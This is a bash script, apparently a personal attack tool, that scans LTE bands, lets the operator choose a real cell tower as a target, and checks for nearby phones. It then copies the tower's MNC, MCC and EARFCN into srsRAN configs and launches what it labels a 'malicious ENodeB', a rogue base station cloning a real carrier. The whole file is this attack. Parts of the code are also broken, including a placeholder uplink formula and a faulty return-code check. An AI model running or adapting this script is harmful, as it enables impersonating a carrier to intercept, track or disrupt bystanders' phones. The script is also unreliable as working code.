#!/bin/bash

DEVICE_ARGS="id=2"
LTESNIFFER_PATH="/home/brayden/Clones/LTESniffer/build/src/"
BANDS=(12)
RSSI_CUTOFF=-40

run_enb() {
    sudo srsenb config/enb.conf &
    sleep 60
    kill $!
}

run_epc() {
    sudo srsepc config/epc.conf &
    sleep 60
    kill $!
}

patch_enb() {
    local mnc=$1
    local mcc=$2
    local earfcn=$3
    sed -i "s/mcc = .*/mcc = ${mcc}/g" config/enb.conf
    sed -i "s/mnc = .*/mnc = ${mnc}/g" config/enb.conf
    sed -i "s/dl_earfcn = .*/dl_earfcn = ${earfcn}/g" config/enb.conf
}

patch_epc() {
    local mnc=$1
    local mcc=$2
    sed -i "s/mcc = .*/mcc = ${mcc}/g" config/epc.conf
    sed -i "s/mnc = .*/mnc = ${mnc}/g" config/epc.conf
}

sniff_sib() {
    local tower=$1
    freq=$(echo "${tower}" | awk '{print $3 "e6"}')
    mnc_mcc=$(bash mnc_sniff.sh "${LTESNIFFER_PATH}" "${freq}")
    echo "${mnc_mcc}"
}

calculate_ul() {
    local dl_earfcn="$1"
    # ul_freq calculation based on dl_earfcn
    # (This is just an example, please replace it with the actual formula)
    ul_freq=$((dl_earfcn + 18000))
    echo "${ul_freq}"
}

parse_output() {
    local output="$1"
    echo "${output}" | awk '
        /Found CELL/ && /EARFCN/ {
            id = substr($6, 7, length($6)-8)
            if (id+0 > 2) {
                print $0
            }
        }'
}

detect_ue() {
    local tower=$1
    dl_earfcn=$(echo "${tower}" | awk -F '[ ,]+' '{print $6}')
    freq=$(calculate_ul "${dl_earfcn}")
    rssi=$(bash signal_strength.sh "${freq}")
    echo "${rssi}"
    if (( $(echo "${rssi} > ${RSSI_CUTOFF}" | bc -l) )); then
        return 0
    else
        return 1
    fi
}

select_tower() {
    local towers="$1"
    local tower_count=$(echo "${towers}" | wc -l)
    local tower_specs
    local selection_index
    local selected_tower

    echo -e "\nChoose Cell Tower to Target\n"

    for i in $(seq 1 "${tower_count}"); do
        tower_specs=$(echo "${towers}" | sed -n "${i}p")
        echo "    ${i}) ${tower_specs}"
    done

    read -rp "Tower Number: " selection_index
    selected_tower=$(echo "${towers}" | sed -n "${selection_index}p")
    echo "${selected_tower}"
}


run_scanner() {
    local all_output=""
    for band in "${BANDS[@]}"; do
        echo "======= Scanning ${band} Band ======="
        start_time=$(date +%s)
        output=$(./cell_search -a "${DEVICE_ARGS}" -b "${band}")
        all_output+="${output}"
        time_run=$(echo "$(date +%s) - ${start_time}" | bc)
        echo "======= Band ${band} Finished (Took ${time_run} seconds) ======="
    done
    echo "${all_output}"
}

main() {
    output=$(run_scanner)
    towers=$(parse_output "${output}")
    while true; do
        selected_tower=$(select_tower "${towers}")
        echo "${selected_tower}"
        rssi=$(detect_ue "${selected_tower}")
        echo "RSSI: ${rssi}"
        if [[ $? -eq 0 ]]; then
            echo "UE Detected, capturing MNC/MCC"
            break
        else
            echo "No UEs detected, select new tower"
        fi
    done
    mnc_mcc=$(sniff_sib "${selected_tower}")
    mnc=$(echo "${mnc_mcc}" | awk '{print $1}')
    mcc=$(echo "${mnc_mcc}" | awk '{print $2}')
    echo "MNC : ${mnc}"
    echo "MCC : ${mcc}"
    echo "===== Patching srsRAN configs ====="
    dl_earfcn=$(echo "${selected_tower}" | awk -F '[ ,]+' '{print $6}')
    patch_enb "${mnc}" "${mcc}" "${dl_earfcn}"
    patch_epc "${mnc}" "${mcc}"

    echo "===== Deploy malicious ENodeB ====="
    run_epc
    run_enb
    }

main
